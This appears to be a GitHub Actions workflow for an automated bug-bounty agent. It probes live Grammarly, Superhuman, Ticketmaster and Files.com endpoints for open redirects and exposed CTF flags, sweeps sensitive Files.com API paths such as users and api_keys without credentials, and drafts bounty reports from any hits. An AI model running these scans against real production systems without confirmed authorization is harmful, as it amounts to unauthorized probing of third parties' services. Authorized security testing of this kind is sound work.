name: Target Proof Hunt
# execute current public-surface proof checks

on:
  push:
    paths:
      - ".github/workflows/proof-hunt.yml"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  proof:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - uses: actions/checkout@v4

      - name: Run low-impact redirect proof checks
        shell: bash
        run: |
          set -euo pipefail
          python - <<'PY'
          import json, subprocess
          from urllib.parse import quote
          canary = 'https://h1-proof-canary.invalid/'
          tests = [
              ('grammarly_ad_target', 'https://www.grammarly.com/a?target=' + quote(canary, safe='')),
              ('grammarly_ad_targetid', 'https://www.grammarly.com/a?target=https%3A%2F%2Fh1-proof-canary.invalid%2F&targetid=1'),
              ('grammarly_logout_redirect', 'https://www.grammarly.com/logout?redirect_to=' + quote(canary, safe='')),
              ('grammarly_redirect', 'https://www.grammarly.com/?redirect=' + quote(canary, safe='')),
              ('superhuman_next', 'https://superhuman.com/?next=' + quote(canary, safe='')),
              ('settings_redirect', 'https://settings.superhuman.com/?redirect=' + quote(canary, safe='')),
              ('id_redirect', 'https://id.superhuman.com/?redirect=' + quote(canary, safe='')),
          ]
          out=[]
          for name,url in tests:
              p=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','8','--max-time','15','-o','/tmp/body','-D','-',url],text=True,capture_output=True)
              lines=p.stdout.splitlines()
              status=next((z for z in lines if z.startswith('HTTP/')), '')
              loc=next((z.split(':',1)[1].strip() for z in lines if z.lower().startswith('location:')), '')
              item={'name':name,'url':url,'status':status,'location':loc,'exit_code':p.returncode,'stderr':p.stderr[-500:]}
              item['external_redirect_proof']=loc.startswith(canary)
              out.append(item)
              print(json.dumps(item, ensure_ascii=False))
          json.dump(out,open('proof-results.json','w'),indent=2)
          PY

      - name: Build report only from demonstrated redirect
        shell: bash
        run: |
          set -euo pipefail
          python - <<'PY'
          import json, pathlib
          rows=json.load(open('proof-results.json'))
          hits=[x for x in rows if x['external_redirect_proof']]
          if not hits:
              pathlib.Path('verified-report.md').write_text('# NO VERIFIED BOUNTY EVIDENCE\n\nNo tested URL returned the external canary in the Location header.\n')
              raise SystemExit(0)
          x=hits[0]
          report='''# Open redirect proof on {base}

## Summary
The tested endpoint returned an HTTP redirect whose Location header pointed to the attacker-controlled external canary supplied in the query parameter.

## Preconditions
None beyond access to the public affected URL and ability to supply the tested parameter.

## Steps to Reproduce
1. Send this GET request without following redirects:
`{url}`
2. Inspect the response Location header.
3. Observe the redirect target shown below.

## Observed Behavior
`{status}` with `Location: {location}`.

## Expected Behavior
An external destination supplied by an unauthenticated caller should not be accepted for an open redirect unless explicitly intended and safely allowlisted.

## Evidence
- Tested URL: `{url}`
- HTTP status: `{status}`
- Location: `{location}`
- Canary: `https://h1-proof-canary.invalid/`
- Program: Superhuman (formerly Grammarly)
'''.format(base=x['url'].split('?')[0],url=x['url'],status=x['status'],location=x['location'])
          pathlib.Path('verified-report.md').write_text(report)
          PY

      - name: Probe authorized Classic Docs CTF backends
        shell: bash
        run: |
          set -euo pipefail
          python - <<'PY'
          import json, re, subprocess
          from pathlib import Path
          doc='1198436185'
          urls=[
            f'https://dox.grammarly.com/documents/{doc}',
            f'https://dox.grammarly.com/documents/{doc}/proofread',
            f'https://dox.grammarly.com/documents/{doc}/content',
            f'https://dox.grammarly.com/documents/{doc}/data',
            f'https://capi.grammarly.com/api/documents/{doc}',
            f'https://capi.grammarly.com/api/v1/documents/{doc}',
            f'https://capi.grammarly.com/api/v1/document/{doc}',
          ]
          rows=[]
          flag_re=re.compile(r'\\$FLAG\\s*[:=]\\s*[^<\\s]{4,500}|FLAG\\{[A-Za-z0-9_-]{4,500}\\}', re.I)
          for u in urls:
            p=subprocess.run(['curl','-sS','-L','--max-redirs','5','--connect-timeout','8','--max-time','15','-A','H1-Bounty-Agent/0.4','-D','/tmp/h','-o','/tmp/b',u],text=True,capture_output=True)
            h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
            b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
            statuses=re.findall(r'^HTTP/[^ ]+\\s+(\\d+)',h,re.M)
            status=statuses[-1] if statuses else ''
            flags=sorted(set(flag_re.findall(b)))[:10]
            rows.append({'url':u,'status':status,'length':len(b),'flag_hits':flags,'contains_doc_id':doc in b,'stderr':p.stderr[-300:]})
            print(json.dumps(rows[-1],ensure_ascii=False))
          Path('ctf-backend-results.json').write_text(json.dumps(rows,indent=2))
          hit=next((x for x in rows if x['flag_hits']),None)
          if hit:
            Path('ctf-backend-report.md').write_text(
              '# Verified Classic Docs CTF exposure\\n\\n'
              '## Program\\nSuperhuman (formerly Grammarly)\\n\\n'
              '## Affected endpoint\\n'+hit['url']+'\\n\\n'
              '## Evidence\\n- HTTP status: '+hit['status']+'\\n- Response length: '+str(hit['length'])+' bytes\\n- Flag pattern: '+hit['flag_hits'][0]+'\\n'
            )
          else:
            Path('ctf-backend-report.md').write_text('# NO VERIFIED CLASSIC DOCS CTF EXPOSURE\\n\\nNo tested backend returned a valid CTF flag pattern.\\n')
          PY

      - name: Upload Classic Docs CTF backend evidence
        uses: actions/upload-artifact@v4
        with:
          name: classic-docs-ctf-backend-evidence
          path: |
            ctf-backend-results.json
            ctf-backend-report.md

      - name: Sweep in-scope Files.com API authorization without credentials
        shell: bash
        run: |
          set -euo pipefail
          python - <<'PY'
          import hashlib, json, re, subprocess, time
          from pathlib import Path

          base = "https://app.files.com"
          targets = [
              ("users","/api/rest/v1/users.json"),
              ("permissions","/api/rest/v1/permissions.json"),
              ("api_keys","/api/rest/v1/api_keys.json"),
              ("custom_domains","/api/rest/v1/custom_domains.json"),
              ("workspaces","/api/rest/v1/workspaces.json"),
              ("event_targets","/api/rest/v1/event_targets.json"),
              ("history","/api/rest/v1/history.json"),
              ("sso_events","/api/rest/v1/sso_events.json"),
              ("sftp_host_keys","/api/rest/v1/sftp_host_keys.json"),
              ("user_lifecycle_rules","/api/rest/v1/user_lifecycle_rules.json"),
              ("remote_servers","/api/rest/v1/remote_servers.json"),
              ("public_keys","/api/rest/v1/public_keys.json"),
          ]
          protected = set(name for name,_ in targets)
          rows=[]
          for name,path in targets:
              url=base+path
              p=subprocess.run(
                  ["curl","-sS","--max-redirs","0","--connect-timeout","8","--max-time","15",
                   "-A","H1-Bounty-Agent/0.4","-D","/tmp/fh","-o","/tmp/fb",url],
                  text=True,capture_output=True
              )
              h=Path("/tmp/fh").read_text(errors="replace") if Path("/tmp/fh").exists() else ""
              b=Path("/tmp/fb").read_text(errors="replace") if Path("/tmp/fb").exists() else ""
              statuses=re.findall(r"^HTTP/[^ ]+\s+(\d+)",h,re.M)
              status=int(statuses[-1]) if statuses else 0
              ct=next((x.split(":",1)[1].strip() for x in h.splitlines() if x.lower().startswith("content-type:")),"")
              row={"endpoint":name,"url":url,"status":status,"content_type":ct,"length":len(b),
                   "response_sha256":hashlib.sha256(b.encode()).hexdigest() if b else "",
                   "json":False,"json_type":None,"record_count":None}
              try:
                  data=json.loads(b)
                  row["json"]=True
                  row["json_type"]=type(data).__name__
                  if isinstance(data,list):
                      row["record_count"]=len(data)
              except Exception:
                  pass
              rows.append(row)
              print(json.dumps(row))
              time.sleep(1.05)

          Path("filescom-unauth-api-sweep.json").write_text(json.dumps(rows,indent=2)+"\n")
          candidates=[
              r for r in rows
              if r["endpoint"] in protected and 200 <= r["status"] < 300
              and r["length"] > 0 and r["json"]
              and (r["record_count"] is None or r["record_count"] > 0)
          ]

          if candidates:
              c=candidates[0]
              Path("filescom-api-candidate.md").write_text(
                  "# Candidate: unauthenticated Files.com API authorization bypass\n\n"
                  "Endpoint: "+c["url"]+"\n"
                  "HTTP status: "+str(c["status"])+"\n"
                  "Content-Type: "+c["content_type"]+"\n"
                  "Response length: "+str(c["length"])+" bytes\n"
                  "Response SHA256: "+c["response_sha256"]+"\n\n"
                  "A protected API endpoint returned a non-empty JSON response without authentication. "
                  "Current Files.com authorization documentation must be cited and the returned record "
                  "must be reviewed before this becomes a submission-ready finding.\n"
              )
              print("FILES_API_CANDIDATE")
          else:
              Path("filescom-api-candidate.md").write_text(
                  "# NO VERIFIED FILES.COM API AUTHORIZATION BYPASS\n\n"
                  "No tested protected endpoint returned a non-empty JSON record set without authentication.\n"
              )
              print("NO_FILES_API_CANDIDATE")
          PY

      - name: Upload Files.com API sweep evidence
        uses: actions/upload-artifact@v4
        with:
          name: filescom-unauth-api-sweep
          path: |
            filescom-unauth-api-sweep.json
            filescom-api-candidate.md

      - name: Upload proof and report
        uses: actions/upload-artifact@v4
        with:
          name: verified-proof-report
          path: |
            proof-results.json
            verified-report.md


  live_nation_safe_probe:
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - name: Probe Ticketmaster bugbountytest with GET only
        shell: bash
        run: |
          set -euo pipefail
          base='https://signup.ticketmaster.com/bugbountytest'
          : > /tmp/live-nation.txt
          echo '== BASE =='
          curl -sSikL --max-redirs 5 --connect-timeout 10 --max-time 30 "$base" | tee -a /tmp/live-nation.txt | sed -n '1,100p'
          echo '== QUERY CANARIES =='
          for q in             '?next=https%3A%2F%2Fexample.com%2Fcanary'             '?redirect=https%3A%2F%2Fexample.com%2Fcanary'             '?return_to=https%3A%2F%2Fexample.com%2Fcanary'             '?callback=https%3A%2F%2Fexample.com%2Fcanary'; do
            echo "--- $q"
            curl -sSikL --max-redirs 5 --connect-timeout 10 --max-time 30 "$base$q" | tee -a /tmp/live-nation.txt | sed -n '1,60p'
          done
          echo '== COMMON FILES =='
          for p in robots.txt sitemap.xml .well-known/security.txt manifest.json; do
            echo "--- $p"
            curl -sSikL --max-redirs 3 --connect-timeout 10 --max-time 20 "https://signup.ticketmaster.com/$p" | tee -a /tmp/live-nation.txt | sed -n '1,40p'
          done
          echo '== FINDING CHECK =='
          if grep -Eiq '(^|[[:space:]])location:.*https?://example\.com/canary' /tmp/live-nation.txt; then
            echo 'FINDING: external redirect to attacker-controlled canary'
            exit 42
          fi
          echo 'NO VERIFIED EXTERNAL REDIRECT'
